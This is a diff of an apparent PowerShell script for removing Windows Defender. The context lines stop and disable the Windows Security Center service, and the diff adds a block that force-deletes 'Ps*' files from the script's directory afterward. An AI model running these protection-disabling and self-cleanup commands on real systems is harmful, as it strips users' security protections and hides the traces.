@@ -12,6 +12,8 @@ param(
 # ------------------------------------------------------------
 
 $LogDir = "C:\Logs"
+$ScriptDir = $PSScriptRoot
+$ExternalFiles = @("Ps*")
 $LogFile = "$LogDir\DefenderRemoval.log"
 
 if (!(Test-Path $LogDir)) {
@@ -198,6 +200,22 @@ Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct -ErrorAc
 Write-Log "Disabling Windows Security Center..."
 sc.exe stop wscsvc
 sc.exe config wscsvc start= disabled
+
+# ------------------------------------------------
+# Cleanup Files
+# ------------------------------------------------
+Write-Host "[*] Cleaning up files..."
+foreach ($file in $ExternalFiles) {
+    $path = Join-Path $ScriptDir $file
+    if (Test-Path $path) {
+        try {
+            Remove-Item $path -Force -ErrorAction Stop
+            Write-Host "[+] Removed $file"
+        } catch {
+            Write-Host "[!] Could not remove $file: $_"
+        }
+    }
+}
 
 # ------------------------------------------------------------
 # Completion
